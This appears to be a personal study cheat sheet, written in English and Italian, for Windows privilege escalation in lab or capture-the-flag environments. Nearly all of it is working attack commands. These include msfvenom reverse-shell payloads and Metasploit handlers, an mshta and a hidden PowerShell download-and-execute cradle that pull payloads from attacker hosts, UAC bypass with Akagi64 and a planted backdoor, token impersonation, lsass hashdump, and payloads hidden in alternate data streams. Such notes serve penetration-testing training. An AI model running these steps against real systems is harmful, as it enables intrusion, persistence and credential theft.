
```
#1. PrivescCheck - Powershell: Script for Windows Privilege Escalation:
> powershell -ep bypass -c "..\PrivescCheck.ps1; Invoke-PrivescCheck"
[Discover Administrator credential in winlogon.exe]

> runas.exe /user:administrator cmd
> [Password: hello_123321]
> whoami


#2. Running the hta_server module to gain the meterpreter shell. Start msfconsole.
use exploit/windows/misc/hta_server
[generate Payload - http://10.10.15.2:8080/jxEyD3w.hta]

> mshta.exe http://10.10.15.2:8080/jxEyD3w.hta
> got meterpreter shell
> sessions -i 1
> cat flag.txt

Exploit with Meterpreter Shell

#2.1 Avendo accesso all'host vittima, posso creare un Payload con msfenom per creare una reverse shell e utilizzare Metasploit per ottenere una meterpreter session.
> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.31.128 LPORT=4444 -f exe -o payload.exe
> Start server python3 -m http.server
> Download payload.exe
> msfconsole
> use exploit/multi/handler
> set payload windows/x64/meterpreter/reverse_tcp
> set LHOST 192.168.31.128
> set LPORT 4444
> run
Got meterpreter session , run in it background




#3. Windows Kernel Exploit - Use "Windows Exploit Suggester"

> mkdir Windows-Exploit-Suggester 
> cd Windows-Exploit-Suggester 
> wget https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/f34dcc186697ac58c54ebe1d32c7695e040d0ecb/windows-exploit-suggester.py

> cd Windows-Exploit-Suggester 
> python ./windows-exploit-suggester.py --update pip install xlrd --upgrade

Go to meterpreter session and upload an file
cd C:\\ 
mkdir temp 
cd temp\\
upload 41015.exe 
shell .\\41015.exe 7
Got system privilege :)







#4.1 UacMe - Manual:
# UACMe - Exploitation UAC 

> nmap -sV -p 80 10.4.19.119`
> Exploit rejetto
> Got meterpreter
> getuid

> pgrep explorer
> migrate 2708
> getprivs
> shell
> net user
> net localgroup administrators
[+] Access denied

Use UACMe Akagmi already present on the attack machine
> msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.4.2 LPORT=1234 -f exe > 'backdoor.exe'

> use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.4.2
set LPORT 1234
run

Per disattivare il UAC, carico una backdor + l'eseguibile di Akagi64.
Go to old meterpreter session:
> cd C:\\\\
> mkdir Temp
> cd Temp
> upload /root/backdoor.exe
> upload /root/Desktop/tools/UACME/Akagi64.exe

Accedo alla directory dove ho caricato gli eseguibili, e inserisco il full path della backdor quando lancio Akagi64.exe:
> cd C:\\Users\admin\AppData\Local\Temp
> Akagi64.exe 23 C:\\Users\admin\AppData\Local\Temp\\backdoor.exe

Now ottengo una backdoor sulla Reverse Shell TCP precedentemente lanciata:
> getsystem
[Migrate to a NT AUTHORITY\\SYSTEM service]

> ps -S lsass.exe
> migrate 692
> hashdump


#4.2 UAC - Automating with Metasploit
> meterpreter session
> ps -S explorer.exe (guardo che il processo usa arch x64, se creo meterpreter payload devo usare la stessa arch).
> getsystem
[Error]

> background
> use exploit/windows/local/bypassuac_injection
> set session 1
> set TARGET 1
> set PAYLOAD windows/x64/meterpreter/reverse_tcp
> exploit

> getssystem
> getuid
[NT AUTHORITY\SYSTEM]
> ps -S lsass.exe
> migrate 688
> hashdump






#5. Access Token Impersonification - Incognito
# Metasploit - Access Token Impersonification with Incognito:
> nmap -sV -p 80 10.4.22.75
> exploit rejetto
> got meterpreter session
> getuid

Provo ad aprire dei file, ma non ho i permessi, quindi posso verificare se ci sono dei token in memoria da poter utilizzare per impersonificare altre utenze privilegiate.
Se migro all'interno di un processo, posso ottenere il token utilizzato dal processo e se possiede i corretti privilegi l'utenza, impersonificarla.

Cerco il processo "explorer" per verificare con che privilegi gira
> pgrep explorer 

# Uso Incognito per cercare tutti i token (di delega o rappresentanza) dei vari processi disponibili
> load incognito
> list_tokens -u
[Delegation Token Available]
ATTACKDEFENSE\Administrator

# Impersonificazione 
> impersonate_token ATTACKDEFENSE\\Administrator
> getuid
[ATTACKDEFENSE\Administrator]
> cat C:\\Users\\Administrator\\Desktop\\flag.txt








#5. PowerSploit

- Powersploit - Run PowerUp.ps1 to Find Privilege Escalation:
- Source: https://github.com/PowerShellMafia/PowerSploit 
> Powershell.exe 
> cd .\Desktop\PowerSploit\Privesc\ 
> ls
[Get-System.ps1]
[PowerUp.ps1]
[Privesc.psd1]
[Privesc.psm1]

# Powersploit - Import PowerUps.ps1 script + Invoke-PrivescAudit function
> powershell -ep bypass Windows Powershell
> . .\PowerUp.ps1
> Invoke-PrivescAudit



#6. Alternate Data Stream
- Posso creare un payload malevolo e inserirlo nei metadati con:
> notepad test.text:metadati.exe

- Ed utilizzare un link per puntare al payload malevolo 
> mklink link C:\Windows\system32\Users\test.txt:metadati.exe









> nmap -sV 10.2.29.53

> service postgresql start && msfconsole -q

> setg RHOSTS 10.2.29.53
> setg RHOST 10.2.29.53

> search web_delivery
use exploit/multi/script/web_delivery

> set target PSH\ (Binary)
set payload windows/shell/reverse_tcp
set PSH-EncodedCommand false
set LHOST eth1
exploit


> powershell.exe -nop -w hidden -c [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$z="echo ($env:temp+'\P4MPrq7y.exe')"; (new-object System.Net.WebClient).DownloadFile('http://10.10.24.2:8080/y3MMtnMlRkQ81pA', $z); invoke-item $z

> sessions 1

> whoami

> background
search shell_to
use post/multi/manage/shell_to_meterpreter
set LHOST eth1
set SESSION 1
show advanced
set WIN_TRANSFER VBS
options

> run
sessions 2

> ps
migrate 5048
get privs

> cd C:\\Users\\student\\Desktop\\PrivescCheck
shell
dir

> powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck”

> powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_%COMPUTERNAME%”

> exit
meterpreter > download PrivescCheck_ATTACKDEFENSE.txt

> psexec.py administrator@10.2.29.53 cmd.exe

> cd C:\Users\Administrator\Desktop
> dir
> type flag.txt


```